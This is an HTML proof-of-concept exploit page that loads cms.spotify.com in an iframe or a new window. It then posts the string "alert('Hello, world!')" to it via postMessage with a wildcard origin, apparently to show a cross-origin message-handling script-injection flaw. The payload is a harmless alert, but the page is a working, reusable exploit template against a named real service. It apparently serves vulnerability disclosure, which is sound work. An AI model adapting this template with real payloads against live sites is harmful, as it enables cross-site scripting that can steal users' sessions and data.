     <!doctype html>
        <html>
            <head>
                <meta charset="UTF-8" />
                <title>POC</title>
                            <style>
            body, html {
                margin: 0;
                padding: 0;
                height: 100%;
            }
            iframe {
                border: none;
                width: 100%;
                height: 100%;
            }
        </style>
                <script>
                    function pocLink() {
                        let win = window.open('https://cms.spotify.com/');
                        let msg = "alert('Hello, world!')";
                        
                        setTimeout(function(){
                            win.postMessage(msg, '*');
                        }, 5000);
                    }
                    function pocFrame(win) {           
                        let msg = "alert('Hello, world!')";
                        
                        win.postMessage(msg, '*');          
                    }
                </script>
            </head>
            <body>
                         
                <iframe src="https://cms.spotify.com/" onload="pocFrame(this.contentWindow)"></iframe>                    
            </body>
        </html>
